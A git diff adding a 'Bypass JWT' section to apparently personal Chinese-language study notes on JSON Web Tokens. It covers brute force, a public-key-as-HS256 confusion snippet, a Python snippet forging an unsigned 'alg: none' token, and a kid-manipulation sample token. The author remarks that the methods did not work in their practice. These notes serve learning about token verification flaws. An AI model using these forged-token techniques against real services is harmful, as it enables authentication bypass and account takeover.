@@ -61,7 +61,16 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4
 
 5. jwt的验证 服务器应用在接受到JWT后，会首先对头部和载荷的内容用同一算法再次签名。如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个Token的内容被别人动过的，我们应该拒绝这个Token。
 
+---
+
+
 ## Bypass JWT
+
+> 以下方法在实际应用破解中未生效，但还是可以浅看一下。
+
+- 工具
+   - [jwt.io](https://jwt.io/)
+   - python jwt 库
 
 ### 暴力破解
 
@@ -85,8 +94,51 @@ public = open('public.pem', 'r').read()
 print jwt.encode({"user": "admin"}, key=public, algorithm='HS256')
 ```
 
+### 修改算法为NONE
+
+签名算法保证了JWT在传输的过程中不被恶意用户修改,但是header中的alg字段可被修改为none。
+
+一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验，将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可。
+当然，这种只适用于低版本的JWT库，高版本的JWT库一般都不支持这种算法。
+
+```py
+import jwt
+
+print(jwt.encode(payload={
+  "iss": "https://demo.sjoerdlangkemper.nl/",
+  "iat": 1668824202,
+  "exp": 1668825402,
+  "data": {
+    "hello": "world"
+  }
+},
+algorithm=None,
+headers={
+  "typ": "JWT",
+  "alg": "none"
+},
+key=None
+))
+```
+
+
+### 密钥可控攻击
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4MjAxIn0.eyJuYW1lIjoiYWRtaW4yMzMzIn0.aC0DlfB3pbeIqAQ18PaaTOPA5PSipJe651w7E0BZZRI
+```
+
+解码之后的头部是
+```json
+{
+  "typ": "JWT",
+  "alg": "sha256",
+  "kid": "8201"
+}
+```
+
+修改 kid 为任意值，在下面的签名中修改即可
 
 ## 参考资料
 
 - https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/
-- 
